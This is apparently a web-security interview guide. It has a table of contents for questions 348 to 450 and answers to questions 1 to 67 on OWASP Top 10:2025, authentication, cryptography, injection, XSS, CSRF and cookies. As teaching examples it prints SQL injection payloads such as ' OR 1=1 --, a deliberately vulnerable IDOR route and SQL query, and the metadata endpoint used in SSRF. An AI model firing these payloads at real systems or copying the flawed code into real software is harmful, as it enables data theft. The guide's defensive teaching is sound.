- [348: What is Sigstore and how does keyless signing work?](#348-what-is-sigstore-and-how-does-keyless-signing-work)
- [349: What was the xz Utils backdoor and what does it teach about supply chain security?](#349-what-was-the-xz-utils-backdoor-and-what-does-it-teach-about-supply-chain-security)
- [350: What are reproducible builds and why do they matter?](#350-what-are-reproducible-builds-and-why-do-they-matter)
- [351: How do you decide whether to add a new dependency from a security point of view?](#351-how-do-you-decide-whether-to-add-a-new-dependency-from-a-security-point-of-view)
- [352: What is OpenSSF Scorecard?](#352-what-is-openssf-scorecard)
- [353: How would you harden a CI/CD pipeline end to end?](#353-how-would-you-harden-a-cicd-pipeline-end-to-end)
- [354: What is the OWASP Top 10 CI/CD Security Risks?](#354-what-is-the-owasp-top-10-cicd-security-risks)
- [355: What is poisoned pipeline execution?](#355-what-is-poisoned-pipeline-execution)
- [356: Why are self-hosted CI runners on public repositories dangerous?](#356-why-are-self-hosted-ci-runners-on-public-repositories-dangerous)
- [357: How would you protect a production deploy from a compromised developer account?](#357-how-would-you-protect-a-production-deploy-from-a-compromised-developer-account)
- [358: How do you design secrets management for a large system?](#358-how-do-you-design-secrets-management-for-a-large-system)
- [359: What is envelope encryption?](#359-what-is-envelope-encryption)
- [360: How do you rotate encryption keys for data already stored?](#360-how-do-you-rotate-encryption-keys-for-data-already-stored)
- [361: How do you search on encrypted fields?](#361-how-do-you-search-on-encrypted-fields)
- [362: What is the difference between a KMS and an HSM?](#362-what-is-the-difference-between-a-kms-and-an-hsm)
- [363: What is post-quantum cryptography and should web developers care now?](#363-what-is-post-quantum-cryptography-and-should-web-developers-care-now)
- [364: How do padding oracle attacks work?](#364-how-do-padding-oracle-attacks-work)
- [365: Why is it dangerous to reuse a nonce with AES-GCM?](#365-why-is-it-dangerous-to-reuse-a-nonce-with-aes-gcm)
- [366: How would you implement field-level encryption for personal data in a Node.js app?](#366-how-would-you-implement-field-level-encryption-for-personal-data-in-a-nodejs-app)
- [367: How do you design logging so it stays useful during an incident?](#367-how-do-you-design-logging-so-it-stays-useful-during-an-incident)
- [368: How do you make logs tamper-evident?](#368-how-do-you-make-logs-tamper-evident)
- [369: What is detection engineering for a web app?](#369-what-is-detection-engineering-for-a-web-app)
- [370: How do you balance security logging with privacy laws like GDPR?](#370-how-do-you-balance-security-logging-with-privacy-laws-like-gdpr)
- [371: What are the phases of incident response?](#371-what-are-the-phases-of-incident-response)
- [372: You find an attacker's web shell on one of your servers. What do you do?](#372-you-find-an-attackers-web-shell-on-one-of-your-servers-what-do-you-do)
- [373: How do you handle a leaked database backup?](#373-how-do-you-handle-a-leaked-database-backup)
- [374: What is the difference between a vulnerability disclosure program and a bug bounty?](#374-what-is-the-difference-between-a-vulnerability-disclosure-program-and-a-bug-bounty)
- [375: How would you prioritize a backlog of 500 vulnerability findings?](#375-how-would-you-prioritize-a-backlog-of-500-vulnerability-findings)
- [376: What is EPSS?](#376-what-is-epss)
- [377: What is reachability analysis in SCA tools?](#377-what-is-reachability-analysis-in-sca-tools)
- [378: How do you secure an application that uses an LLM with tools (an AI agent)?](#378-how-do-you-secure-an-application-that-uses-an-llm-with-tools-an-ai-agent)
- [379: Why can't you fully fix prompt injection with a better system prompt?](#379-why-cant-you-fully-fix-prompt-injection-with-a-better-system-prompt)
- [380: What is the lethal trifecta for AI agents?](#380-what-is-the-lethal-trifecta-for-ai-agents)
- [381: How can an LLM chat UI leak data through Markdown images?](#381-how-can-an-llm-chat-ui-leak-data-through-markdown-images)
- [382: How do you test an application for access control bugs at scale?](#382-how-do-you-test-an-application-for-access-control-bugs-at-scale)
- [383: What is GraphQL introspection abuse and is disabling introspection enough?](#383-what-is-graphql-introspection-abuse-and-is-disabling-introspection-enough)
- [384: How do you protect a GraphQL API from resource exhaustion?](#384-how-do-you-protect-a-graphql-api-from-resource-exhaustion)
- [385: What are the security concerns with server-side rendering?](#385-what-are-the-security-concerns-with-server-side-rendering)
- [386: How can a module-level variable cause a data leak in a Node.js server?](#386-how-can-a-module-level-variable-cause-a-data-leak-in-a-nodejs-server)
- [387: How do you secure server-to-server calls to third-party APIs?](#387-how-do-you-secure-server-to-server-calls-to-third-party-apis)
- [388: What is certificate pinning and why is it less common now?](#388-what-is-certificate-pinning-and-why-is-it-less-common-now)
- [389: What is Certificate Transparency?](#389-what-is-certificate-transparency)
- [390: How would you design rate limiting for a distributed system?](#390-how-would-you-design-rate-limiting-for-a-distributed-system)
- [391: How do attackers bypass IP-based rate limiting, and how do you respond?](#391-how-do-attackers-bypass-ip-based-rate-limiting-and-how-do-you-respond)
- [392: Why is trusting X-Forwarded-For dangerous?](#392-why-is-trusting-x-forwarded-for-dangerous)
- [393: How do you safely implement "login as user" (impersonation) for support staff?](#393-how-do-you-safely-implement-login-as-user-impersonation-for-support-staff)
- [394: What is the difference between authorization at the API layer and at the data layer?](#394-what-is-the-difference-between-authorization-at-the-api-layer-and-at-the-data-layer)
- [395: How do you prevent privilege escalation through role management features?](#395-how-do-you-prevent-privilege-escalation-through-role-management-features)
- [396: What are common pitfalls with SAML-based single sign-on?](#396-what-are-common-pitfalls-with-saml-based-single-sign-on)
- [397: What is account takeover through OAuth account linking?](#397-what-is-account-takeover-through-oauth-account-linking)
- [398: How do you prevent pre-account takeover?](#398-how-do-you-prevent-pre-account-takeover)
- [399: How would you secure a public file sharing link feature?](#399-how-would-you-secure-a-public-file-sharing-link-feature)
- [400: What are pre-signed URLs and what are their risks?](#400-what-are-pre-signed-urls-and-what-are-their-risks)
- [401: How do you secure Kubernetes workloads running a web app?](#401-how-do-you-secure-kubernetes-workloads-running-a-web-app)
- [402: How does an SSRF in a Kubernetes pod become a cluster compromise?](#402-how-does-an-ssrf-in-a-kubernetes-pod-become-a-cluster-compromise)
- [403: What is the difference between a WAF and RASP?](#403-what-is-the-difference-between-a-waf-and-rasp)
- [404: How do attackers bypass WAFs, and what does that mean for defense?](#404-how-do-attackers-bypass-wafs-and-what-does-that-mean-for-defense)
- [405: What is second-order SQL injection?](#405-what-is-second-order-sql-injection)
- [406: How does blind SQL injection work?](#406-how-does-blind-sql-injection-work)
- [407: How do you design an app so injection bugs are unlikely in the first place?](#407-how-do-you-design-an-app-so-injection-bugs-are-unlikely-in-the-first-place)
- [408: What is a secure-by-design and secure-by-default approach?](#408-what-is-a-secure-by-design-and-secure-by-default-approach)
- [409: How do you securely handle the deserialization of JSON into class instances?](#409-how-do-you-securely-handle-the-deserialization-of-json-into-class-instances)
- [410: What is a gadget chain in deserialization attacks?](#410-what-is-a-gadget-chain-in-deserialization-attacks)
- [411: How do you approach security for a monolith being split into microservices?](#411-how-do-you-approach-security-for-a-monolith-being-split-into-microservices)
- [412: How would you secure a webhook delivery system that sends events to customer URLs?](#412-how-would-you-secure-a-webhook-delivery-system-that-sends-events-to-customer-urls)
- [413: What are the security trade-offs of storing sessions in Redis vs signed cookies?](#413-what-are-the-security-trade-offs-of-storing-sessions-in-redis-vs-signed-cookies)
- [414: How would you migrate a large app from session cookies to passkeys?](#414-how-would-you-migrate-a-large-app-from-session-cookies-to-passkeys)
- [415: What does the WebAuthn server need to verify during login?](#415-what-does-the-webauthn-server-need-to-verify-during-login)
- [416: How do you defend against adversary-in-the-middle phishing kits like Evilginx?](#416-how-do-you-defend-against-adversary-in-the-middle-phishing-kits-like-evilginx)
- [417: What is the Device Bound Session Credentials (DBSC) proposal?](#417-what-is-the-device-bound-session-credentials-dbsc-proposal)
- [418: How do you design a secure API key format?](#418-how-do-you-design-a-secure-api-key-format)
- [419: How would you investigate a suspected IDOR exploitation from logs?](#419-how-would-you-investigate-a-suspected-idor-exploitation-from-logs)
- [420: How do you test for race conditions in a web app?](#420-how-do-you-test-for-race-conditions-in-a-web-app)
- [421: Why can transactions alone fail to prevent race conditions?](#421-why-can-transactions-alone-fail-to-prevent-race-conditions)
- [422: What is a JSON Web Token's "none" equivalent in other formats, and what is the general lesson?](#422-what-is-a-json-web-tokens-none-equivalent-in-other-formats-and-what-is-the-general-lesson)
- [423: How do you handle security for feature flags and configuration services?](#423-how-do-you-handle-security-for-feature-flags-and-configuration-services)
- [424: What are the security risks of client-side feature flags or entitlements?](#424-what-are-the-security-risks-of-client-side-feature-flags-or-entitlements)
- [425: How would you review a pull request that adds a new "export to CSV" feature?](#425-how-would-you-review-a-pull-request-that-adds-a-new-export-to-csv-feature)
- [426: What makes an error message an information disclosure problem?](#426-what-makes-an-error-message-an-information-disclosure-problem)
- [427: How can different error handling paths cause access control bypasses?](#427-how-can-different-error-handling-paths-cause-access-control-bypasses)
- [428: How do you test that an app fails closed?](#428-how-do-you-test-that-an-app-fails-closed)
- [429: What is the security impact of not handling resource cleanup on errors?](#429-what-is-the-security-impact-of-not-handling-resource-cleanup-on-errors)
- [430: How would you secure a multi-step workflow like a loan application?](#430-how-would-you-secure-a-multi-step-workflow-like-a-loan-application)
- [431: How do you protect against clickjacking on pages that must be embeddable?](#431-how-do-you-protect-against-clickjacking-on-pages-that-must-be-embeddable)
- [432: Why can SameSite=Lax cookies still be bypassed for CSRF?](#432-why-can-samesitelax-cookies-still-be-bypassed-for-csrf)
- [433: What is the security impact of a single XSS on a site with good CSRF protection?](#433-what-is-the-security-impact-of-a-single-xss-on-a-site-with-good-csrf-protection)
- [434: How do you approach security in a design review for a new public API?](#434-how-do-you-approach-security-in-a-design-review-for-a-new-public-api)
- [435: How would you build a security program for a small startup with no security team?](#435-how-would-you-build-a-security-program-for-a-small-startup-with-no-security-team)
- [436: How would you measure whether your application security program is working?](#436-how-would-you-measure-whether-your-application-security-program-is-working)
- [437: How do you get developers to actually fix security findings?](#437-how-do-you-get-developers-to-actually-fix-security-findings)
- [438: What is the difference between a security control being preventive, detective and corrective?](#438-what-is-the-difference-between-a-security-control-being-preventive-detective-and-corrective)
- [439: How would you design security for a browser extension that talks to your web app?](#439-how-would-you-design-security-for-a-browser-extension-that-talks-to-your-web-app)
- [440: What is subresource poisoning through a compromised CDN or package host, and how do you limit it?](#440-what-is-subresource-poisoning-through-a-compromised-cdn-or-package-host-and-how-do-you-limit-it)
- [441: How would you secure a feature where users can write custom code or templates (like email templates)?](#441-how-would-you-secure-a-feature-where-users-can-write-custom-code-or-templates-like-email-templates)
- [442: Why is Node.js's vm module not a security boundary?](#442-why-is-nodejss-vm-module-not-a-security-boundary)
- [443: How do you think about security for WebAssembly in the browser?](#443-how-do-you-think-about-security-for-webassembly-in-the-browser)
- [444: How would you secure a real-time collaborative app (like a shared document editor)?](#444-how-would-you-secure-a-real-time-collaborative-app-like-a-shared-document-editor)
- [445: How can browser caching leak sensitive data, and how do you prevent it?](#445-how-can-browser-caching-leak-sensitive-data-and-how-do-you-prevent-it)
- [446: What is the risk of exposing source maps in production?](#446-what-is-the-risk-of-exposing-source-maps-in-production)
- [447: How would you approach a security review of an app that was mostly written by an AI coding assistant?](#447-how-would-you-approach-a-security-review-of-an-app-that-was-mostly-written-by-an-ai-coding-assistant)
- [448: What is slopsquatting?](#448-what-is-slopsquatting)
- [449: Scenario: your monitoring shows a spike of successful logins from many IPs to many accounts. What do you do?](#449-scenario-your-monitoring-shows-a-spike-of-successful-logins-from-many-ips-to-many-accounts-what-do-you-do)
- [450: If you could make only three security changes to an existing web app, which would you choose and why?](#450-if-you-could-make-only-three-security-changes-to-an-existing-web-app-which-would-you-choose-and-why)

---

# Easy Questions (1-150)

## 1: What is OWASP?

OWASP stands for Open Worldwide Application Security Project. It is a non-profit foundation that publishes free material about application security: the Top 10 list, cheat sheets, testing guides, tools like ZAP, and standards like ASVS. Anyone can use its material, and most of the work is done by volunteers.

The name used to be Open Web Application Security Project. It was changed in 2023 to "Worldwide", but the acronym stayed the same.

## 2: What is the OWASP Top 10?

The OWASP Top 10 is a list of the ten most important security risk categories for web applications. It is built from data that companies and security vendors share about the vulnerabilities they find, plus a community survey.

It is an awareness document, not a full standard. It tells developers where most real problems come from. If you need a full checklist to test against, OWASP points you to ASVS instead.

## 3: What are the categories in the OWASP Top 10:2025?

- A01:2025 Broken Access Control
- A02:2025 Security Misconfiguration
- A03:2025 Software Supply Chain Failures
- A04:2025 Cryptographic Failures
- A05:2025 Injection
- A06:2025 Insecure Design
- A07:2025 Authentication Failures
- A08:2025 Software or Data Integrity Failures
- A09:2025 Security Logging and Alerting Failures
- A10:2025 Mishandling of Exceptional Conditions

## 4: How often is the OWASP Top 10 updated?

There is no fixed schedule, but it has come out every three to four years: 2003, 2004, 2007, 2010, 2013, 2017, 2021 and 2025. Each new version uses fresh data, so categories move up or down, get merged, or get replaced.

## 5: What changed between the OWASP Top 10 2021 and 2025?

The main changes are:

- Security Misconfiguration moved up from A05 to A02.
- Vulnerable and Outdated Components became the wider Software Supply Chain Failures (A03).
- Server-Side Request Forgery (SSRF), which had its own spot (A10:2021), was merged into Broken Access Control.
- Identification and Authentication Failures was renamed to Authentication Failures.
- Security Logging and Monitoring Failures was renamed to Security Logging and Alerting Failures.
- A new category was added: Mishandling of Exceptional Conditions (A10).

Broken Access Control stayed at number one.

## 6: What is a vulnerability?

A vulnerability is a weakness in code, configuration or design that an attacker can use to do something they should not be able to do, like read other users' data or run commands on the server. A missing authorization check, a SQL query built with string concatenation and an outdated library with a known bug are all vulnerabilities.

## 7: What is the difference between a vulnerability, a threat and a risk?

- A vulnerability is the weakness itself, for example an unprotected admin endpoint.
- A threat is someone or something that could use that weakness, for example an attacker scanning for admin pages.
- A risk is how likely it is that the threat uses the vulnerability, combined with how bad the damage would be.

You reduce risk by fixing vulnerabilities, lowering the chance of attack, or limiting the impact.

## 8: What is an exploit?

An exploit is the actual code, request or set of steps that takes advantage of a vulnerability. For example, a vulnerability might be "the search field is not escaped", and the exploit is the specific `' OR 1=1 --` payload sent to it.

## 9: What is the CIA triad?

CIA stands for Confidentiality, Integrity and Availability. It is the basic model for what security protects:

- Confidentiality: only the right people can read the data.
- Integrity: data is not changed by people who should not change it.
- Availability: the system works when users need it.

Most attacks target one or more of these. Data leaks break confidentiality, tampering breaks integrity, and denial of service breaks availability.

## 10: What is the difference between authentication and authorization?

Authentication answers "who are you?". It checks identity, usually with a password, a passkey or a token.

Authorization answers "what are you allowed to do?". It checks permissions after the user is known.

Logging in is authentication. Checking that the logged-in user may delete a specific invoice is authorization. Many serious bugs happen when an app does the first and forgets the second.

## 11: What is Broken Access Control?

Broken Access Control (A01:2025) means users can act outside their intended permissions. Examples:

- Changing `/orders/1001` to `/orders/1002` and seeing someone else's order.
- A normal user calling an admin API because only the button was hidden in the UI.
- Editing a JWT or cookie to change your role.
- Calling `PUT` or `DELETE` on an endpoint that only checks permissions for `GET`.

It is the number one category because it shows up in almost every application that gets tested.

## 12: What is IDOR?

IDOR stands for Insecure Direct Object Reference. It happens when an app uses an ID from the request to load a record but does not check that the record belongs to the current user.

```js
// Vulnerable: any logged-in user can read any invoice
app.get("/invoices/:id", async (req, res) => {
  const invoice = await db.invoice.findUnique({ where: { id: req.params.id } });
  res.json(invoice);
});
```

The fix is to always scope the query to the user, or check ownership before returning the data.

## 13: Why is hiding a button in the UI not enough for access control?

The UI is just a client. Anyone can open DevTools, use curl or Postman, and send the request directly to the API. If the server does not check permissions, hiding the button does nothing. Every access control decision must happen on the server.

## 14: What is the principle of least privilege?

Every user, service and process should get only the permissions it needs to do its job, and nothing more. A reporting service should have read-only database access. A background job that sends emails does not need access to the payments table. If something gets compromised, least privilege limits how much damage it can do.

## 15: What is "deny by default"?

Deny by default means access is refused unless a rule clearly allows it. New endpoints, roles or resources start with no access, and you add permissions on purpose. The opposite, allowing everything and blocking specific things, tends to leave gaps when someone adds a new route and forgets to protect it.

## 16: What is vertical and horizontal privilege escalation?

- Vertical escalation: a user gets a higher level of access, for example a normal user doing admin actions.
- Horizontal escalation: a user gets access to another user's data at the same level, for example reading another customer's orders.

IDOR is the most common form of horizontal escalation.

## 17: What is Security Misconfiguration?

Security Misconfiguration (A02:2025) covers unsafe settings rather than bugs in code. Common examples:

- Default admin passwords left in place.
- Debug mode or stack traces turned on in production.
- Directory listing enabled on the web server.
- Public cloud storage buckets.
- Missing security headers.
- Unused features, ports or sample apps left enabled.

## 18: Why should you turn off debug mode in production?

Debug mode often shows stack traces, file paths, SQL queries, environment variables and framework versions. That tells an attacker a lot about how the app is built. Some debug tools even let you run code from the browser. In production, show a generic error page and keep the details in server logs.

## 19: What is Software Supply Chain Failures?

Software Supply Chain Failures (A03:2025) covers risks from everything your app depends on and everything used to build it: npm packages, Docker base images, build tools, CI/CD pipelines and package registries. Examples include using a library with a known vulnerability, installing a malicious package, or an attacker getting into your build system and changing what gets deployed.

## 20: What is a vulnerable dependency?

A vulnerable dependency is a third-party library or package in your project that has a known security bug. Since most of the code in a modern web app comes from dependencies, an old version of one library can expose the whole app. Log4Shell in 2021 is a famous example: a bug in the Java logging library Log4j affected a huge number of systems.

## 21: How do you check a Node.js project for vulnerable dependencies?

Run `npm audit`. It compares your installed packages against a database of known vulnerabilities and shows which ones are affected and how serious they are.

```bash
npm audit
npm audit --omit=dev     # only production dependencies
npm audit fix            # upgrade to fixed versions where possible
```

Tools like Dependabot, Renovate, Snyk and OWASP Dependency-Check do the same thing continuously.

## 22: What is Cryptographic Failures?

Cryptographic Failures (A04:2025) means sensitive data is not protected properly with cryptography, or the cryptography is used wrong. Examples:

- Sending data over plain HTTP.
- Storing passwords with MD5 or SHA-1, or in plain text.
- Using old algorithms like DES or RC4.
- Hardcoding encryption keys in source code.
- Using `Math.random()` for tokens.

It was called Sensitive Data Exposure before 2021.

## 23: What is the difference between encoding, encryption and hashing?

- Encoding changes the format of data so it can be used safely somewhere, like Base64 or URL encoding. Anyone can decode it. It is not security.
- Encryption scrambles data with a key. Only someone with the right key can decrypt it. It is two-way.
- Hashing turns data into a fixed-length value. It is one-way: you cannot get the original back from the hash.

Use encryption when you need the data back later, and hashing for passwords and integrity checks.

## 24: Is Base64 encryption?

No. Base64 is just encoding. It turns binary data into text characters, and anyone can decode it in one line. Storing a password or API key "encrypted with Base64" means it is stored in plain text for practical purposes.

```js
atob("cGFzc3dvcmQxMjM="); // "password123"
```

## 25: What is the difference between symmetric and asymmetric encryption?

Symmetric encryption uses the same key to encrypt and decrypt. It is fast and is used for bulk data. AES is the standard choice.

Asymmetric encryption uses a key pair: a public key and a private key. Data encrypted with the public key can only be decrypted with the private key. It is slower, so it is mainly used for key exchange and digital signatures. RSA and elliptic curve algorithms (ECDH, ECDSA, Ed25519) are common examples.

HTTPS uses both: asymmetric crypto to agree on a key, then symmetric crypto for the actual traffic.

## 26: Why should passwords be hashed and not encrypted?

If passwords are encrypted, anyone who gets the key can decrypt all of them. The server never needs the original password back. It only needs to check if the password a user types matches. Hashing is one-way, so even if the database leaks, the attacker still has to guess each password.

## 27: Which algorithms should you use to hash passwords?

Use a slow, purpose-built password hashing algorithm. OWASP's current recommendations, in order:

1. Argon2id
2. scrypt
3. bcrypt (for older systems)
4. PBKDF2 (when FIPS compliance is needed)

Do not use fast hashes like MD5, SHA-1 or plain SHA-256 for passwords. They are designed to be fast, which makes brute force attacks easy.

## 28: What is a salt?

A salt is a random value added to each password before hashing. Every user gets a different salt, and it is stored next to the hash. Salts make sure two users with the same password get different hashes, and they make precomputed tables (rainbow tables) useless. Argon2, bcrypt and scrypt create and store salts for you.

## 29: What is a rainbow table?

A rainbow table is a precomputed list of hashes for many common passwords. If passwords are hashed without a salt, an attacker can look up a hash and find the password instantly. Unique salts per password defeat rainbow tables, because the attacker would need a separate table for every salt.

## 30: What is HTTPS?

HTTPS is HTTP sent over TLS (Transport Layer Security). TLS encrypts the traffic between the browser and the server and checks the server's certificate, so nobody in the middle can read or change the data. Every site should use HTTPS on every page, not just on login or payment pages.

## 31: What is TLS?

TLS is the protocol that secures HTTPS and many other connections. It does three things: encrypts the data, checks that it was not changed in transit, and proves the server's identity with a certificate. The current versions are TLS 1.2 and TLS 1.3. SSL and TLS 1.0 and 1.1 are old and should be disabled.

## 32: What is Injection?

Injection (A05:2025) happens when untrusted data is sent to an interpreter as part of a command or query, and the interpreter runs part of that data as code. Common types:

- SQL injection
- NoSQL injection
- OS command injection
- LDAP injection
- Template injection
- Cross-site scripting (XSS), which OWASP groups under Injection

The root cause is mixing code and data in the same string.

## 33: What is SQL injection?

SQL injection happens when user input is put directly into a SQL query, so the attacker can change what the query does.

```js
// Vulnerable
const sql = `SELECT * FROM users WHERE email = '${email}'`;
```

If `email` is `' OR '1'='1`, the query returns every user. Worse payloads can delete tables or read other data. The fix is to use parameterized queries, where the input is always treated as data.

## 34: What is a parameterized query?

A parameterized query (also called a prepared statement) sends the SQL and the values separately to the database. The database knows which part is code and which part is data, so input can never change the query structure.

```js
// node-postgres
const result = await pool.query("SELECT * FROM users WHERE email = $1", [
  email,
]);
```

This is the main defense against SQL injection.

## 35: What is Cross-Site Scripting (XSS)?

XSS happens when an attacker gets their JavaScript to run in another user's browser on your site. The script runs with your site's origin, so it can read the page, make requests as the user, steal tokens from `localStorage`, or change what the user sees.

It usually happens when user input is put into HTML without proper encoding.

## 36: What are the main types of XSS?

- Stored XSS: the payload is saved on the server (in a comment, profile name and so on) and shown to other users later.
- Reflected XSS: the payload is in the request (usually the URL) and the server puts it straight into the response.
- DOM-based XSS: the payload never touches the server. Client-side JavaScript takes data from somewhere like `location.hash` and writes it into the page unsafely.

## 37: What is output encoding?

Output encoding means converting special characters to a safe form for the place where the data is shown. In HTML, `<` becomes `&lt;` and `"` becomes `&quot;`, so the browser shows them as text instead of treating them as markup. The right encoding depends on the context: HTML body, HTML attribute, JavaScript, CSS or URL each need different rules.

## 38: How do frameworks like React and Angular help against XSS?

They escape values by default when you render them in templates. In React, `{userInput}` is rendered as text, not HTML. Angular does the same with `{{ }}` and also sanitizes values bound to `[innerHTML]`.

The protection goes away when you use escape hatches like React's `dangerouslySetInnerHTML`, Angular's `bypassSecurityTrustHtml`, or direct DOM access like `element.innerHTML`.

## 39: What is Insecure Design?

Insecure Design (A06:2025) is about flaws in how a feature was planned, not how it was coded. Even perfect code cannot fix a bad design. Examples:

- A password reset that uses security questions like "What is your mother's maiden name?".
- A checkout that trusts the price sent by the browser.
- No limit on how many gift card codes someone can try.

The fix is to think about abuse cases and threats during design, before writing code.

## 40: What is the difference between a design flaw and an implementation bug?

An implementation bug is a mistake in code for a design that was fine, like forgetting to escape one field. A design flaw means the feature is unsafe even if coded exactly as planned, like letting users pick their own discount percentage in the request. Implementation bugs get fixed with a code change. Design flaws often need the feature to be rethought.

## 41: What is Authentication Failures?

Authentication Failures (A07:2025) covers weaknesses in how users prove who they are. Examples:

- Allowing weak or common passwords.
- No protection against brute force or credential stuffing.
- Session IDs in URLs.
- Sessions that never expire or are not invalidated on logout.
- Weak password reset flows.
- No multi-factor authentication for sensitive accounts.

## 42: What is credential stuffing?

Credential stuffing is when attackers take username and password pairs leaked from one site and try them on other sites. It works because many people reuse passwords. Defenses include MFA, rate limiting, bot detection, checking passwords against known breach lists, and passkeys.

## 43: What is a brute force attack?

A brute force attack tries many passwords (or codes, or tokens) until one works. Against a login form, it can be stopped or slowed with rate limiting, increasing delays, temporary lockouts, CAPTCHA after several failures, and MFA. For stored hashes, slow hashing algorithms make brute force expensive.

## 44: What is multi-factor authentication (MFA)?

MFA requires two or more different kinds of proof to log in:

- Something you know: a password or PIN.
- Something you have: a phone, hardware key or authenticator app.
- Something you are: a fingerprint or face.

Even if a password leaks, the attacker still needs the second factor. Authenticator apps and hardware keys are much stronger than SMS codes.

## 45: What is a passkey?

A passkey is a login credential based on public key cryptography, built on the WebAuthn and FIDO2 standards. The private key stays on the user's device or in their password manager, and the site only stores the public key. Passkeys are bound to the website's domain, so they cannot be phished, and there is no password to leak or reuse.

## 46: What is a session?

A session is how a server remembers a user between requests, since HTTP itself is stateless. After login, the server creates a session, stores data about it, and gives the browser a random session ID, usually in a cookie. The browser sends that ID with every request, and the server uses it to know who the user is.

## 47: What makes a good session ID?

- Long and random enough that it cannot be guessed (OWASP suggests at least 64 bits of entropy).
- Generated with a cryptographically secure random generator.
- Has no meaning. It should not contain the user ID or anything else.
- Sent only in a cookie, never in the URL.
- Replaced with a new one after login.

## 48: What is session fixation?

Session fixation is when an attacker gets a victim to use a session ID the attacker already knows. If the app keeps the same ID after login, the attacker can then use it to act as the logged-in victim. The fix is simple: always create a new session ID when the user logs in or their privilege level changes.

## 49: What is Software or Data Integrity Failures?

Software or Data Integrity Failures (A08:2025) happen when code or data is trusted without checking that it has not been changed. Examples:

- Loading scripts from a CDN without integrity checks.
- Auto-updates that do not verify signatures.
- Deserializing untrusted data into objects.
- Trusting data in a cookie or hidden field that the user can change.

## 50: What is Security Logging and Alerting Failures?

Security Logging and Alerting Failures (A09:2025) means the app does not record security events, or nobody notices when something bad happens. Without logs and alerts, a breach can go on for months. Examples: not logging failed logins, logs that only stay on the local disk, no alerts on suspicious activity, and logs that contain passwords or tokens.

The 2025 name puts more weight on alerting, because logs that nobody looks at do not help.

## 51: What is Mishandling of Exceptional Conditions?

Mishandling of Exceptional Conditions (A10:2025) is new in 2025. It covers what happens when things go wrong: errors, timeouts, missing data, unexpected input. Problems include:

- Showing stack traces or internal details to users.
- Failing open, where an error in a permission check lets the request through.
- Leaving data in a half-updated state after an error.
- Crashing the app on unexpected input.

## 52: What does "fail closed" mean?

Fail closed (or fail secure) means that when something breaks, the system denies access instead of allowing it. If the authorization service times out, the request should be rejected, not let through.

```js
async function canEdit(user, doc) {
  try {
    return await authz.check(user, "edit", doc);
  } catch (err) {
    logger.error({ err }, "authz check failed");
    return false; // fail closed
  }
}
```

## 53: What is Server-Side Request Forgery (SSRF)?

SSRF happens when an attacker can make your server send a request to a URL they choose. Since the request comes from inside your network, it can reach things the attacker cannot reach directly: internal services, admin panels, or the cloud metadata endpoint at `169.254.169.254`, which can hand out cloud credentials.

Features like "import from URL", webhooks and link previews are common places for SSRF. In the 2025 Top 10, SSRF is part of Broken Access Control.

## 54: What is Cross-Site Request Forgery (CSRF)?

CSRF tricks a logged-in user's browser into sending a request to your site that the user did not intend. For example, a malicious page has a hidden form that posts to `bank.com/transfer`. If the bank relies only on cookies for authentication, the browser attaches them and the transfer goes through.

Defenses include CSRF tokens, `SameSite` cookies, and checking the `Origin` or `Sec-Fetch-Site` headers.

## 55: What is a CSRF token?

A CSRF token is a random, secret value the server gives to the page (in a form field or a meta tag). The page must send it back with every state-changing request. A malicious site cannot read the token because of the same-origin policy, so it cannot build a valid request.

```html
<form method="POST" action="/account/email">
  <input type="hidden" name="_csrf" value="r4nd0m-t0k3n-value" />
  <input type="email" name="email" />
  <button>Save</button>
</form>
```

## 56: What is the same-origin policy?

The same-origin policy is a browser rule that stops scripts on one origin from reading data from another origin. An origin is the combination of scheme, host and port. `https://app.com` and `https://api.app.com` are different origins, and so are `http://app.com` and `https://app.com`.

A script can send requests to other origins in some cases, but it cannot read the responses unless the other origin allows it with CORS.

## 57: What is CORS?

CORS (Cross-Origin Resource Sharing) lets a server tell the browser which other origins may read its responses. It works through response headers like `Access-Control-Allow-Origin`.

CORS relaxes the same-origin policy. It does not add protection. A server with no CORS headers is the most locked-down setting. Opening CORS too wide, like reflecting any origin with credentials allowed, can let any website read your users' data.

## 58: Does CORS protect your API from attackers?

No. CORS is enforced by browsers only, and only on reading responses. An attacker using curl, a script or Postman ignores CORS completely. CORS protects your users' browsers from malicious sites reading their data. It does not replace authentication or authorization on the server.

## 59: What are cookies?

Cookies are small pieces of data a server stores in the browser with the `Set-Cookie` header. The browser sends them back on later requests to that site. They are often used for session IDs, so their security settings matter a lot.

```http
Set-Cookie: sid=abc123; HttpOnly; Secure; SameSite=Lax; Path=/; Max-Age=3600
```

## 60: What does the HttpOnly cookie flag do?

`HttpOnly` stops JavaScript from reading the cookie through `document.cookie`. If an attacker finds an XSS bug, they cannot simply steal the session cookie. Session cookies should always be `HttpOnly`. Note that XSS can still make requests with the cookie attached, so `HttpOnly` limits damage but does not fix XSS.

## 61: What does the Secure cookie flag do?

`Secure` tells the browser to send the cookie only over HTTPS. Without it, the cookie could be sent over plain HTTP and read by anyone on the network. All cookies with sensitive data should have `Secure`.

## 62: What does the SameSite cookie attribute do?

`SameSite` controls whether the cookie is sent with requests that come from other sites:

- `Strict`: never sent on cross-site requests, even when clicking a link to your site.
- `Lax`: sent on top-level navigations with safe methods like `GET` (clicking a link), but not on cross-site `POST`, iframes or fetch calls.
- `None`: always sent. It requires `Secure`.

Most modern browsers treat cookies without `SameSite` as `Lax`. This blocks many CSRF attacks, but it should not be your only CSRF defense.

## 63: What is clickjacking?

Clickjacking is when an attacker loads your site in an invisible iframe on their page and tricks the user into clicking buttons on it. The user thinks they are clicking something harmless, but they are actually clicking "Delete account" or "Confirm payment" on your site.

The fix is to stop other sites from framing your pages with `Content-Security-Policy: frame-ancestors 'none'` (or `'self'`), or the older `X-Frame-Options: DENY` header.

## 64: What is Content Security Policy (CSP)?

CSP is a response header that tells the browser which sources of scripts, styles, images and other content are allowed on the page. If an attacker injects a script, the browser refuses to run it when it does not match the policy.

```http
Content-Security-Policy: default-src 'self'; script-src 'self'; object-src 'none'; frame-ancestors 'none'
```

CSP is a second layer of defense against XSS. It does not replace output encoding.

## 65: What is HSTS?

HSTS (HTTP Strict Transport Security) is a header that tells the browser to only use HTTPS for your site for a set time. After the browser sees it, it changes any `http://` request to `https://` before sending it, which blocks SSL stripping attacks.

```http
Strict-Transport-Security: max-age=31536000; includeSubDomains
```

## 66: What does the X-Content-Type-Options header do?

`X-Content-Type-Options: nosniff` tells the browser not to guess the content type of a response. Without it, a browser might treat an uploaded text file as JavaScript or HTML if the content looks like it. Set it on all responses.

## 67: What is input validation?

Input validation checks that data from users or other systems has the expected type, format, length and range before you use it. For example, an age must be an integer between 0 and 150, and an email must match an email format.

